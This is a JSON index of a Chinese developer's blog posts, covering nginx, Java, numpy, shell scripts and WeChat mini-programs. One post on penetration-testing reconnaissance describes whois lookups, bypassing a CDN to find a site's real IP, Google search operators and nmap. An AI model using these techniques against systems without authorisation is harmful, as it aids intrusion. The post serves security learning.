[{"title":"Incompatibile SockJS! Main site uses \"1.1.5\", the iframe \"1.0.0\"","date":"2020-11-16T11:48:00.000Z","path":"2020/11/16/java/Incompatibile SockJS/","text":"在spring boot 后端开发集成websocket的过程中，本地测试都OK,但是部署到服务器上后抛出了异常 Incompatibile SockJS! Main site uses: “1.1.5”, the iframe: “1.0.0”。 大概意思是版本不匹配，和服务器部署唯一的不同之处就是服务器通过nginx来代理请求。主要原因是upgrade header没有从nginx传给spring，nginx对应代理服务节点上配置下边的头信息即可: 1234567#告诉nginx使用HTTP/1.1通信协议，这是websoket必须要使用的协议）proxy_http_version 1.1;#告诉nginx，当它想要使用WebSocket时，响应http升级请求proxy_set_header Upgrade $http_upgrade;proxy_set_header Connection &quot;upgrade&quot;; nginx配置完成后重启nginx问题就解决了。","updated":"2020-11-16T12:09:48.315Z","tags":[{"name":"java","slug":"java","permalink":"http://xwolf191.github.io/tags/java/"}]},{"title":"g2.ps1，因为在此系统上禁止运行脚本","date":"2020-08-05T15:00:00.000Z","path":"2020/08/05/前端/g2.ps1，因为在此系统上禁止运行脚本/","text":"在进行安装配置nutui开发环境的时候各种出错。用的官方推荐的工具gaea CLI,刚开始执行命令便出错了。1234567g2 : 无法加载文件 C:\\Users\\Administrator\\AppData\\Roaming\\npm\\g2.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。所在位置 行:1 字符: 1+ g2 init driver-nut+ ~~ + CategoryInfo : SecurityError: (:) []，PSSecurityException + FullyQualifiedErrorId : UnauthorizedAccess 解决方法也较简单，重新设置一下权限，再次安装即可。项目可以正常初始化了，在nodejs安装依赖的过程中又出现了各种错误。 python版本必须是2.x,不支持python3 . 这就是在编译nutui的过程中遇到的问题。","updated":"2020-08-05T15:46:33.755Z","tags":[{"name":"app","slug":"app","permalink":"http://xwolf191.github.io/tags/app/"},{"name":"nutui","slug":"nutui","permalink":"http://xwolf191.github.io/tags/nutui/"}]},{"title":"","date":"2020-07-19T00:23:27.969Z","path":"2020/07/19/开发工具/gitlab安装/","text":"下载速度很慢 参考资料 gitlab 官网 gitlab 安装文档(centos7)","updated":"2020-07-19T00:23:27.969Z","tags":[]},{"title":"1. Two Sum","date":"2020-06-09T13:25:00.000Z","path":"2020/06/09/数据结构和算法/leetcode/Two Sum/","text":"Given an array of integers, return indices of the two numbers such that they add up to a specific target. You may assume that each input would have exactly one solution, and you may not use the same element twice. Example 1234Given nums = [2, 7, 11, 15], target = 9,Because nums[0] + nums[1] = 2 + 7 = 9,return [0, 1]. 实现暴力枚举暴力枚举是循环找出所有元素中符合条件的元素。123456789101112131415161718/** * 暴力枚举. * * @param nums * @param target * @return */ public int[] twoSum(int[] nums, int target) &#123; var length = nums.length; for (var i = 0; i &lt; length - 1; i++) &#123; for (var j = i + 1; j &lt; length; j++) &#123; if (nums[i] + nums[j] == target) &#123; return new int[]&#123;i, j&#125;; &#125; &#125; &#125; return new int[]&#123;-1, -1&#125;; &#125; 字典暂存实现利用字典将目标值保存，最后从字典中取值即可。12345678910111213141516public static int[] twoSumByDict(int[] nums, int target) &#123; var arr = new int[]&#123;-1, -1&#125;; if (nums == null || nums.length == 0) &#123; return arr; &#125; var map = new HashMap&lt;Integer, Integer&gt;(); for (var i = 0; i &lt; nums.length; i++) &#123; if (map.containsKey(target - nums[i])) &#123; arr[0] = i; arr[1] = map.get(target - nums[i]); return arr; &#125; map.put(nums[i], i); &#125; return arr; &#125; 双指针实现双指针需要先排序数组,指针来指向首尾元素,根据首尾元素之和与目标和的大小关系来移动指针。123456789101112131415161718192021222324252627282930313233/** * 双指针实现. * * @param nums * @param target * @return */ public static int[] twoSumByDoublePointer(int[] nums, int target) &#123; var newNums = Arrays.copyOf(nums, nums.length); Arrays.sort(newNums); var left = 0; var right = newNums.length - 1; var result = new int[]&#123;&#125;; while (left &lt; right) &#123; var sum = newNums[left] + newNums[right]; if (sum == target) &#123; result = new int[]&#123;left, right&#125;; break; &#125; if (sum &gt; target) &#123; right--; &#125; if (sum &lt; target) &#123; left++; &#125; &#125; var list = new ArrayList&lt;Integer&gt;(); for (int num : nums) &#123; list.add(num); &#125; return new int[]&#123;list.indexOf(newNums[result[0]]), list.lastIndexOf(newNums[result[1]])&#125;; &#125; 参考 Two Sum","updated":"2020-07-19T00:23:28.041Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"arrays","slug":"arrays","permalink":"http://xwolf191.github.io/tags/arrays/"}]},{"title":"numpy基础使用","date":"2019-09-04T09:30:00.000Z","path":"2019/09/04/python/numpy基础使用/","text":"NumPy(Numerical Python) 是 Python 语言的一个扩展程序库，支持大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。 NumPy 的前身 Numeric 最早是由 Jim Hugunin 与其它协作者共同开发，2005 年，Travis Oliphant 在 Numeric 中结合了另一个同性质的程序库 Numarray 的特色，并加入了其它扩展而开发了 NumPy。NumPy 为开放源代码并且由许多协作者共同维护开发。 NumPy 是一个运行速度非常快的数学库，主要用于数组计算，包含： 一个强大的 N 维数组对象 ndarray 广播功能函数 整合 C/C++/Fortran 代码的工具 线性代数、傅里叶变换、随机数生成等功能 三角函数numpy 支持各种不同的三角函数,例子中列举部分三角函数. 123456789101112131415161718192021222324252627import numpy as np def trigonometricFunction(self): \"\"\" 三角函数,sin cos tan arcsin arccos arctan :return: \"\"\" # 角度转化为弧度 angle = 30 / 180 * np.pi # 正弦 print(\"sin30°=\", np.sin(angle)) # 余弦 print(\"cos30°=\", np.cos(angle)) # 正切 print(\"tan30°=\", np.tan(angle)) # 没有提供余切,可用正切的倒数来计算 print(\"cot30°= 1/tan30°=\", 1 / np.tan(angle)) # 反正弦 print(\"arcsin30°=\", np.arcsin(angle)) # 反余弦 print(\"arccos30°=\", np.arccos(angle)) # 反正切 print(\"arctan30°=\", np.arctan(angle)) # 反双曲正弦 print(\"arcsinh30°=\", np.arcsinh(angle)) 输出结果: 12345678sin30°= 0.49999999999999994cos30°= 0.8660254037844387tan30°= 0.5773502691896257cot30°= 1/tan30°= 1.7320508075688774arcsin30°= 0.5510695830994463arccos30°= 1.0197267436954502arctan30°= 0.48234790710102493arcsinh30°= 0.5022189850346115/ 基础的几个三角函数至此已大概列出. N 维数组(ndarray)N 维数组对象是 numpy 的核心,NumPy 最重要的一个特点是其 N 维数组对象 ndarray，它是一系列同类型数据的集合，以 0 下标为开始进行集合中元素的索引。 ndarray 对象是用于存放同类型元素的多维数组。 ndarray 中的每个元素在内存中都有相同存储大小的区域。 ndarray 内部由以下内容组成： 一个指向数据（内存或内存映射文件中的一块数据）的指针。 数据类型或 dtype，描述在数组中的固定大小值的格子。 一个表示数组形状（shape）的元组，表示各维度大小的元组。 一个跨度元组（stride），其中的整数指的是为了前进到当前维度下一个元素需要”跨过”的字节数。 创建narray 对象的构建方式有这么几种: array(p_object, dtype=None, copy=True, order=’K’, subok=False, ndmin=0) p_object:普通 array 对象;dtype 指定元素类型;copy 对象是否需要复制;order 创建数组的样式，C 为行方向，F 为列方向，A 为任意方向;subok 默认返回一个与基类类型一致的数组;ndmin 指定生成数组的最小维度. arange(start=None, stop=None, step=None, dtype=None) start 指定开始元素;stop 指定结束元素;step 指定步长;dtype 指定元素类型 zeros(shape, dtype=None, order=’C’) 指定元素全部为 0 的对象,shape 指定数组形状;dtype 指定元素类型;order ‘C’ 用于 C 的行数组，或者 ‘F’ 用于 FORTRAN 的列数组。 empty(shape, dtype=None, order=’C’) 指定元素全部为未初始化预设值的对象,order 有”C”和”F”两个选项,分别代表，行优先和列优先，在计算机内存中的存储元素的顺序。其余参数和 zeros 一样. ones(shape, dtype=None, order=’C’) 创建指定形状的数组，数组元素以 1 来填充.order: ‘C’ 用于 C 的行数组，或者 ‘F’ 用于 FORTRAN 的列数组. eye(N, M=None, k=0, dtype=float, order=’C’) 创建对角线为 1,其他为 0 的数组. N:行数，M 列数. identity(n, dtype=None) 创建对角线为 1,其他为 0 的 n 阶方阵. 123456789101112131415161718192021222324252627282930import numpy as np def narray(self): \"\"\" 多维数组创建 :return: \"\"\" # 普通数组转化为ndarray对象 ary = [1, 4, 65, 1] aAry = np.array(ary) print(\"根据普通数据创建ndarray对象\", aAry) # 创建全是0的多维数组 zeroAry = np.zeros((2, 5)) print(\"创建元素全是0的多维数组\", zeroAry) # 创建空元素数组,默认会是比较奇怪的预设元素 emptyAry = np.empty((4,)) print(\"创建元素全是未初始化预设元素的多维数组\", emptyAry) # 通过arange生成有序数组 bAry = np.arange(10, dtype='float') print(\"arange生成数组对象\", bAry) # 通过arange生成有序数组 cAry = np.arange(start=2, stop=50, step=3, dtype='float') print(\"arange生成数组对象\", cAry) # 元素都为1的数组 one = np.ones((1, 3)) print(\"元素为1的数组\", one) # 对角线为1,其他均为0 c = np.eye(4, 4) print(\"指定对角线为1的数组\", c) 输出信息为: 1234567891011根据普通数据创建ndarray对象 [ 1 4 65 1]创建元素全是0的多维数组 [[0. 0. 0. 0. 0.] [0. 0. 0. 0. 0.]]创建元素全是未初始化预设元素的多维数组 [1.78018403e-306 1.69120281e-306 7.56599807e-307 8.90104239e-307]arange生成数组对象 [0. 1. 2. 3. 4. 5. 6. 7. 8. 9.]arange生成数组对象 [ 2. 5. 8. 11. 14. 17. 20. 23. 26. 29. 32. 35. 38. 41. 44. 47.]元素为1的数组 [[1. 1. 1.]]指定对角线为1的数组 [[1. 0. 0. 0.] [0. 1. 0. 0.] [0. 0. 1. 0.] [0. 0. 0. 1.]] 基本的创建操作完成. 属性和方法numpy 中的二维数组的元素索引方式图: 线性代数矩阵和行列式相关计算. 12 参考资料 Numpy 官网","updated":"2020-07-19T00:23:27.899Z","tags":[{"name":"python","slug":"python","permalink":"http://xwolf191.github.io/tags/python/"}]},{"title":"java导出word","date":"2019-09-02T08:40:00.000Z","path":"2019/09/02/java/java导出word/","text":"在企业级应用中经常会有导出 word 或者 excel 的需求。通常的方法有直接用 POI 构造 word 或 excel 输出,还有一种是提前设计好模板只需填充数据即可。本文以最后一种方式来说明。 准备模板新建 excel 模板: 另存为 xml 后的内容为: 注意要填充的目标字段属性不能被空格或其他字符破坏，否则数据填充失败. 填充数据此处以简单的对象填充入手. 1234567891011121314151617public void exportExcel() throws Exception&#123; Map&lt;String, Object&gt; map = Maps.newHashMap(); map.put(\"month\", \"201908\"); map.put(\"name\", \"斯马拉森\"); map.put(\"empNo\", \"TN2018323223\"); map.put(\"baseSalary\", \"4000\"); map.put(\"salary\", \"50000\"); Configuration configuration = new Configuration(); configuration.setDefaultEncoding(\"UTF-8\"); // 指定模板路径为/ configuration.setClassForTemplateLoading(ExportExcelTest.class.getClass(),\"/\"); Template template = configuration.getTemplate(\"salary.xml\"); // 指定输出目录 Writer writer = new FileWriter(new File(\"c:/abc.xls\")); template.process(map,writer); &#125; 注意基础路径的设置,否则会抛出找不到模板文件的异常 freemarker.template.TemplateNotFoundException。执行完成后即可看到目标文件已经生成,数据也填充成功. list 填充简单对象填充后,一般都是 List 数据类型的导出.修改 excel 对应的 xml 模板,加上 freemarker 的 List 标签。 123456789101112131415161718192021222324252627282930&lt;#list itemList as item &gt;&lt;Row ss:AutoFitHeight=\"0\" ss:Height=\"55.5\" ss:StyleID=\"s62\"&gt; &lt;Cell ss:StyleID=\"s72\"&gt; &lt;Data ss:Type=\"String\"&gt;$&#123;item.month&#125;&lt;/Data&gt; &lt;/Cell&gt; &lt;Cell ss:StyleID=\"s72\"&gt; &lt;Data ss:Type=\"String\"&gt;$&#123;item.name&#125;&lt;/Data&gt; &lt;/Cell&gt; &lt;Cell ss:StyleID=\"s72\"&gt; &lt;Data ss:Type=\"String\"&gt;$&#123;item.empNo&#125;&lt;/Data&gt; &lt;/Cell&gt; &lt;Cell ss:StyleID=\"s72\"&gt; &lt;Data ss:Type=\"String\"&gt;$&#123;item.baseSalary&#125;&lt;/Data&gt; &lt;/Cell&gt; &lt;Cell ss:StyleID=\"s72\"/&gt; &lt;Cell ss:StyleID=\"s72\"/&gt; &lt;Cell ss:StyleID=\"s72\"/&gt; &lt;Cell ss:StyleID=\"s72\"/&gt; &lt;Cell ss:StyleID=\"s72\"/&gt; &lt;Cell ss:StyleID=\"s72\"/&gt; &lt;Cell ss:StyleID=\"s72\"/&gt; &lt;Cell ss:StyleID=\"s72\"/&gt; &lt;Cell ss:StyleID=\"s72\"/&gt; &lt;Cell ss:StyleID=\"s72\"/&gt; &lt;Cell ss:StyleID=\"s72\"/&gt; &lt;Cell ss:StyleID=\"s72\"&gt; &lt;Data ss:Type=\"String\"&gt;$&#123;item.salary&#125;&lt;/Data&gt; &lt;/Cell&gt; &lt;/Row&gt; &lt;/#list&gt; 修改导出程序如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283public class ExportExcelTest &#123; class Item&#123; private String month; private String name; private String empNo; private String baseSalary; private String salary; public String getMonth() &#123; return month; &#125; public void setMonth(String month) &#123; this.month = month; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getEmpNo() &#123; return empNo; &#125; public void setEmpNo(String empNo) &#123; this.empNo = empNo; &#125; public String getBaseSalary() &#123; return baseSalary; &#125; public void setBaseSalary(String baseSalary) &#123; this.baseSalary = baseSalary; &#125; public String getSalary() &#123; return salary; &#125; public void setSalary(String salary) &#123; this.salary = salary; &#125; &#125; /** * List导出 **/ @Test public void exportListExcel() throws Exception&#123; Item item = new Item(); item.setMonth(\"201908\"); item.setEmpNo(\"SA322W\"); item.setName(\"王司机\"); item.setBaseSalary(\"4000\"); item.setSalary(\"50040\"); Item item1 = new Item(); item1.setMonth(\"201908\"); item1.setEmpNo(\"SA322W\"); item1.setName(\"王司机\"); item1.setBaseSalary(\"4000\"); item1.setSalary(\"50040\"); List&lt;Item&gt; items = Lists.newArrayList(item,item1); Map&lt;String,Object&gt; data = Maps.newHashMap(); data.put(\"itemList\",items); Configuration configuration = new Configuration(); configuration.setDefaultEncoding(\"UTF-8\"); configuration.setClassForTemplateLoading(ExportExcelTest.class.getClass(),\"/\"); Template template = configuration.getTemplate(\"salary1.xml\"); Writer writer = new FileWriter(new File(\"c:/abc.xls\")); template.process(data,writer); &#125;&#125; 数据列表导出的时候一直报空,但是确实有数据.有点奇怪,终于在 stackoverflow 中找到了答案,封装的实体对象必须是 public 的。 所以一定要将上边的 Item 对象声明为 public。 至此，excel 的导出模板完成,word 也是一样的道理. 参考资料 the-following-has-evaluated-to-null-or-missing-when-executing-freemarker(stackoverflow) Create a data-model(Freemarker Official)","updated":"2020-07-19T00:23:27.855Z","tags":[{"name":"java","slug":"java","permalink":"http://xwolf191.github.io/tags/java/"}]},{"title":"用户线程和守护线程","date":"2019-08-30T07:34:00.000Z","path":"2019/08/30/java/用户线程和守护线程/","text":"Java 提供了两种类型的线程：守护线程 和 用户线程。 用户线程是高优先级线程。JVM 在终止之前会等待所有用户线程完成其任务。 守护线程是低优先级线程。其唯一作用是为用户线程提供服务。 所有非守护线程执行完成后会退出 JVM,不管守护线程是否执行完成,所以在守护线程中不要做一些 IO 操作,可能会出现资源无法正常关闭等问题。 守护线程的创建通过 setDaemon(true)方法将线程设置为守护线程,并且必须在 start()方法之前设置否则会抛出 IllegalThreadStateException。通过 isDaemon()方法判断当前线程是否是守护线程，返回 true 表示当前线程为守护线程。 12345678910111213141516171819202122232425262728293031/** * 所有非守护线程执行完成后会退出JVM,不管守护线程是否执行完成. * * @author xwolf */public class DaemonThread &#123; /** * 设置为守护线程. */ public void daemon() &#123; Thread thread = new Thread(() -&gt; &#123; try &#123; TimeUnit.DAYS.sleep(Long.MAX_VALUE); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;, \"Daemon-Thread\"); thread.setDaemon(true); thread.start(); System.out.println(\"守护线程启动,\" + thread.getName()); &#125; public static void main(String[] args) throws InterruptedException &#123; DaemonThread daemonThread = new DaemonThread(); daemonThread.daemon(); TimeUnit.SECONDS.sleep(5); System.out.println(\"main线程完成退出.\"); &#125;&#125; 可见主线程执行 5s 后 JVM 退出,此时虽然还是有 Daemon 线程运行. 再看另一种类型的主线程退出,但是仍有用户线程执行的情况. 1234567891011121314151617181920212223242526272829303132333435import java.util.concurrent.TimeUnit;/** * 所有非守护线程执行完成后会退出JVM,不管守护线程是否执行完成. * * @author xwolf */public class DaemonThread &#123; /** * 设置为非守护线程. */ public void noneDaemon() &#123; Thread thread = new Thread(() -&gt; &#123; try &#123; TimeUnit.DAYS.sleep(Long.MAX_VALUE); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;, \"NoneDaemon-Thread\"); // 设置为非守护线程 thread.setDaemon(false); thread.start(); System.out.println(\"非守护线程启动,\" + thread.getName()); &#125; public static void main(String[] args) throws InterruptedException &#123; DaemonThread daemonThread = new DaemonThread(); daemonThread.noneDaemon(); TimeUnit.SECONDS.sleep(5); System.out.println(\"main线程完成退出.\"); &#125;&#125; 虽然主线程退出了,但是此时仍有用户线程执行 JVM 不会退出。 至此,大概的用户线程和守护线程的区别已介绍完了。","updated":"2020-07-19T00:23:27.870Z","tags":[{"name":"java","slug":"java","permalink":"http://xwolf191.github.io/tags/java/"}]},{"title":"linux自定义服务启动脚本","date":"2019-08-13T05:45:00.000Z","path":"2019/08/13/linux/linux自定义服务启动脚本/","text":"如题,启动 java 程序的时候启停服务比较麻烦,自定义 shell 脚本来完成此项任务. shell 的语法脚本看着比较怪. shift 用法shift 参数操作，是将参数从左到右逐个移动。 比如：现在有$1, $2, $3, $4, $5, ….几个参数shift操作后，$1 被处理过之后，$2变为$1, $3变为$2, $4变为$3, $5变为$4, … 就这样依次变动shift 操作后，参数还是按照上面的一个规律进行变化。 123456#!/bin/bashwhile [ $# -ne 0 ]do echo \"第一个参数为: $1 参数个数为: $#\" shiftdone 输出结果: 1234567[root@aa test]# ./shift.sh a b c d e f第一个参数为: a 参数个数为: 6第一个参数为: b 参数个数为: 5第一个参数为: c 参数个数为: 4第一个参数为: d 参数个数为: 3第一个参数为: e 参数个数为: 2第一个参数为: f 参数个数为: 1 启动脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#!/bin/bash# 获取第一个启动参数case $1 instart)# 堆内存设置MIN_HEAP_SIZE='-Xms128m'MAX_HEAP_SIZE='-Xmx512m'DATE=\"`date '+%Y%m%d%H%M'`\"# log dirLOG_DIR=\"/app/logs/life-$DATE.log\"echo $LOG_DIR# app nameAPP=\"life-0.0.1-SNAPSHOT.jar\"# start appnohup java -jar $MIN_HEAD_SIZE $MAX_HEAP_SIZE $APP &gt;$LOG_DIR &amp;;;## 停止服务stop)## 服务名称SERVICE=\"life-\"## 服务PID(排除grep本身进程)PID=$(ps -ef | grep $SERVICE | grep -v \"grep\" | awk '&#123;print $2&#125;')# 判断PID是否存在if [[ ! -z \"$PID\" ]] then echo \"The PID is $PID,will be killed.\" kill -9 $PIDelse echo \"There's no service to stop.\"fi;;## 重启服务restart) shift # 先停止服务 \"$0\" stop $&#123;@&#125; sleep 3 # 启动服务 \"$0\" start $&#123;@&#125; ;;## 输入其他信息返回提示信息*) echo \"Usage: $0 &#123;start|stop|restart&#125;\" ;;esac 简单的服务脚本已 ok。","updated":"2020-07-19T00:23:27.882Z","tags":[{"name":"linux","slug":"linux","permalink":"http://xwolf191.github.io/tags/linux/"}]},{"title":"414 Request-URI Too Large","date":"2019-08-08T06:35:00.000Z","path":"2019/08/08/linux/414 Request-URI Too Large/","text":"发布文章时,访问服务器nginx错误信息:123456789101112&lt;html&gt;&lt;head&gt; &lt;title&gt;414 Request-URI Too Large&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=\"white\"&gt; &lt;center&gt; &lt;h1&gt;414 Request-URI Too Large&lt;/h1&gt; &lt;/center&gt; &lt;hr&gt; &lt;center&gt;openresty/1.13.6.2&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 文章内容数据量比较大,修改nginx的缓存区大小 12client_header_buffer_size 1m;large_client_header_buffers 4 1m; 重启nginx即可.","updated":"2020-07-19T00:23:27.874Z","tags":[{"name":"linux","slug":"linux","permalink":"http://xwolf191.github.io/tags/linux/"},{"name":"nginx","slug":"nginx","permalink":"http://xwolf191.github.io/tags/nginx/"}]},{"title":"小程序设置全局分享","date":"2019-08-04T01:20:00.000Z","path":"2019/08/04/前端/小程序设置全局分享/","text":"如题在app.js中配置即可，设置全局分享页面 123456789101112131415161718!function () &#123; var PageTmp = Page; Page = function (pageConfig) &#123; // 设置全局默认分享 pageConfig = Object.assign(&#123; onShareAppMessage: function () &#123; return &#123; title: '点滴', imageUrl: '/images/share.jpg', path: '/pages/home/home/index' &#125;; &#125; &#125;, pageConfig); PageTmp(pageConfig); &#125;;&#125;();","updated":"2020-07-19T00:23:27.951Z","tags":[{"name":"小程序","slug":"小程序","permalink":"http://xwolf191.github.io/tags/小程序/"}]},{"title":"小程序tab不显示","date":"2019-08-04T01:10:00.000Z","path":"2019/08/04/前端/小程序tab不显示/","text":"配置好tabBar后页面不显示菜单. 必须要保证pages和tabbar顺序一致: 12345678910111213141516171819202122232425262728293031323334353637&#123; \"pages\": [ \"pages/index/index\", \"pages/home/home/index\", \"pages/account/home/index\", \"pages/statistic/home/index\", \"pages/center/home/index\" ], \"tabBar\": &#123; \"list\": [&#123; \"pagePath\": \"pages/home/home/index\", \"text\": \"首页\", \"iconPath\": \"/static/images/bar/home.png\", \"selectedIconPath\": \"/static/images/bar/home-active.png\" &#125;, &#123; \"pagePath\": \"pages/account/home/index\", \"text\": \"记账\", \"iconPath\": \"/static/images/bar/account.png\", \"selectedIconPath\": \"/static/images/bar/account-active.png\" &#125;, &#123; \"pagePath\": \"pages/statistic/home/index\", \"text\": \"统计\", \"iconPath\": \"/static/images/bar/statistics.png\", \"selectedIconPath\": \"/static/images/bar/statistics-active.png\" &#125;, &#123; \"pagePath\": \"pages/center/home/index\", \"text\": \"个人中心\", \"iconPath\": \"/static/images/bar/user.png\", \"selectedIconPath\": \"/static/images/bar/user-active.png\" &#125;] &#125;&#125; 这样就可以显示菜单了,pages中第一个页面为启动页，可自行配置。","updated":"2020-07-19T00:23:27.951Z","tags":[{"name":"小程序","slug":"小程序","permalink":"http://xwolf191.github.io/tags/小程序/"}]},{"title":"nginx配置https","date":"2019-08-02T12:30:00.000Z","path":"2019/08/02/linux/nginx配置https/","text":"https 配置首先需要去购买 ssl 证书.我是从西部数据购买的证书。当然阿里云、腾讯、百度、华为都有免费的 SSL 证书。 购买证书购买后下载 SSL 证书即可 将证书上传至服务器. 配置 nginx直接配置 nginx 的 ssl 证书路径即可. 1234567891011121314151617181920212223242526272829# HTTPS server server &#123; listen 443 ssl; server_name www.example.com; ssl_certificate /var/ssl/example.com.crt; ssl_certificate_key /var/ssl/example.com.key; ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; location / &#123; root html; index index.html index.htm; &#125; location /life/api/v1/ &#123; proxy_pass http://127.0.0.1:9090/api/v1/; proxy_redirect off; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Cookie $http_cookie; &#125; &#125; nginx 配置的话也比较简单。","updated":"2020-07-19T00:23:27.882Z","tags":[{"name":"nginx","slug":"nginx","permalink":"http://xwolf191.github.io/tags/nginx/"}]},{"title":"nginx默认首页配置","date":"2019-07-27T14:10:00.000Z","path":"2019/07/27/linux/nginx默认首页配置/","text":"http节点下配置index,指定具体的路径即可. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364worker_processes 1;error_log /logs/openresty/error.log;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log /logs/openresty/access.log; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; # 指定默认配置首页路径 index index.html; #gzip on; server &#123; listen 80; server_name localhost 39.104.70.154; charset utf8; #access_log logs/host.access.log main; location /api/&#123; proxy_pass http://127.0.0.1:8080; index index.html index.htm; &#125; location / &#123; root html; index index.html; &#125; location /hello &#123; default_type text/html; content_by_lua &apos;ngx.say(&quot;Hello Nginx&quot;)&apos;; &#125; error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;&#125;","updated":"2020-07-19T00:23:27.884Z","tags":[{"name":"nginx","slug":"nginx","permalink":"http://xwolf191.github.io/tags/nginx/"}]},{"title":"Token校验失败,请检查确认","date":"2019-07-25T04:30:00.000Z","path":"2019/07/25/前端/Token校验失败请检查确认/","text":"小程序开启消息推送的时候需要做签名验证,但是总是提示失败。 确认签名规则检查签名字符串的拼接规则,开发者通过检验 signature 对请求进行校验（下面有校验方式）。若确认此次 GET 请求来自微信服务器，请原样返回 echostr 参数内容，则接入生效，成为开发者成功，否则接入失败。加密/校验流程如下： 将 token、timestamp、nonce 三个参数进行字典序排序 将三个参数字符串拼接成一个字符串进行 sha1 加密 开发者获得加密后的字符串可与 signature 对比，标识该请求来源于微信 先将值放入数组中,再字典排序后拼接为一个字符串最后 SHA-1 加密得到签名。 实现方法12345678910111213141516171819@GetMapping(\"sign\") public void sign( @RequestParam(\"signature\") String signature, @RequestParam(\"timestamp\") String timestamp, @RequestParam(\"nonce\") String nonce, @RequestParam(\"echostr\") String echostr, HttpServletResponse response) &#123; log.info(\"timestamp=&#123;&#125;,nonce=&#123;&#125;,echostr=&#123;&#125;,signature=&#123;&#125;\", timestamp, nonce, echostr, signature); String token = \"U2FsdGVkX1CuUzHYj7SALkzMSP1Kj913\"; String[] signAry = &#123;timestamp, nonce, token&#125;; String sign = SignUtil.sign(signAry); log.info(\"sign=&#123;&#125;\", sign); if(Objects.equals(sign, signature)) &#123; try &#123; response.getWriter().write(echostr); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; 签名方法1234567891011121314151617public class SignUtil &#123; /** * 将数组排序后SHA1签名. * * @param strAry 待签名数组 */ public static String sign(String[] strAry) &#123; if(strAry == null || strAry.length == 0) &#123; return null; &#125; Arrays.sort(strAry); String signStr = String.join(\"\", strAry); return SHA1Util.encrypt(signStr); &#125;&#125; SHA-1 加密12345678910111213141516171819202122232425262728293031323334353637383940public class SHA1Util &#123; private static final char[] HEX_DIGITS = &#123;'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'&#125;; /** * Takes the raw bytes from the digest and formats them correct. * * @param bytes the raw bytes from the digest. * @return the formatted bytes. */ private static String getFormattedText(byte[] bytes) &#123; int len = bytes.length; StringBuilder buf = new StringBuilder(len * 2); // 把密文转换成十六进制的字符串形式 for(int j = 0; j &lt; len; j++) &#123; buf.append(HEX_DIGITS[( bytes[j] &gt;&gt; 4 ) &amp; 0x0f]); buf.append(HEX_DIGITS[bytes[j] &amp; 0x0f]); &#125; return buf.toString(); &#125; /** * 加密. * * @param str 待加密字符串 */ public static String encrypt(String str) &#123; if(str == null) &#123; return null; &#125; try &#123; MessageDigest messageDigest = MessageDigest.getInstance(\"SHA1\"); messageDigest.update(str.getBytes()); return getFormattedText(messageDigest.digest()); &#125; catch (Exception e) &#123; throw new RuntimeException(e); &#125; &#125;&#125; 返回值类型最后如果验签通过,返回 echostr.一定返回地是普通的文本内容,非字符串。否则也会配置失败。 参考资料 微信消息推送文档","updated":"2020-07-19T00:23:27.947Z","tags":[{"name":"小程序","slug":"小程序","permalink":"http://xwolf191.github.io/tags/小程序/"}]},{"title":"渗透测试之信息收集","date":"2019-07-16T07:00:00.000Z","path":"2019/07/16/security/渗透测试之信息收集/","text":"渗透测试主要的一点就是获取服务器的各种信息.本节主要是一些基础的服务器信息收集的工具和常识. 域名信息主要通过 whois 查看域名的拥有者等信息.Whois 简单来说，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商、域名注册日期和过期日期等）。通过域名 Whois 服务器查询，可以查询域名归属者联系方式，以及注册和到期时间,可以用 whois.chinaz.com 访问或者 linux 上已经集成了该命令. 获取真实 IP验证是否存在 CDN使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了 CDN,多地 Ping 网站有： 站长工具 &gt; Ping 检测 网站 Ping 检测—检测网站在各地的 Ping 值—卡卡网 Ping 查询_专业的 IP 地址库_IPIP.NET PING 检测-爱站网 以其中一个工具检测 dns 信息: linux 下可以用 nslookup 查看 dns 信息. 绕过 CDN 查找网站真实 IP查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有： DNSDB 微步在线 viewdns netcraft 用其中一个来查看的部分信息: 搜索引擎掌握搜索引擎的常用用法可以检索一些特定的信息,包括 url,正文,title 等特定位置的特定信息. google 搜索引擎语法12345678910111213141516inurl: 在url地址栏中显示的信息页面intext: 显示在正文信息中的内容页面site: 限制显示你某个域名的所有页面filetype: 搜索文件的后缀或者扩展名intitle: 限制你搜索的网页标题页面link: 将显示有到指定网页的链接的网页cache:将显示在Google cache中的网页allintitle: 搜索所有关键字构成标题的网页.（allintite:关键字或者url地址） 操作符123456 + 把google可能忽略的字列如查询范围 - 把某个字忽略~ 同意词. 单一的通配符* 通配符，可代表多个字母&quot;&quot; 精确查询 服务端口信息通过 nmap,windows 下的图形化工具 zenmap 